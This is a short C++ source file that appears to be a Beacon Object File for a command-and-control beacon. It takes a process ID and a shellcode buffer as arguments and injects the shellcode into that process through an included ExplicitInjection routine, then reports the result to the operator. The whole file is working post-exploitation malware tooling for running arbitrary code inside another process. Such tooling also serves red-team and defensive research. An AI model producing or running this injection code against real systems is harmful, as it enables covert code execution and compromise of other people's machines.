#include "../kit/kit_explicit_inject.cc"

extern "C" auto go( char* args, int argc ) -> void {
    datap DataPsr = { 0 };

    BeaconDataParse( &DataPsr, args, argc );

    ULONG ProcessId = BeaconDataInt( &DataPsr );

    INT32 ShellcodeSize = 0;
    PBYTE ShellcodeBuff = (PBYTE)BeaconDataExtract( &DataPsr, &ShellcodeSize );

    auto status = ExplicitInjection( ProcessId, TRUE, ShellcodeBuff, ShellcodeSize, nullptr );

    if ( nt_success( status ) ) {
        BeaconPrintfW( CALLBACK_OUTPUT, L"Process injected!" );
    } else {
        BeaconPrintfW( CALLBACK_ERROR, L"Failed to inject with error: (%d) %s", GetLastError(), fmt_error( GetLastError() ) );
    }
}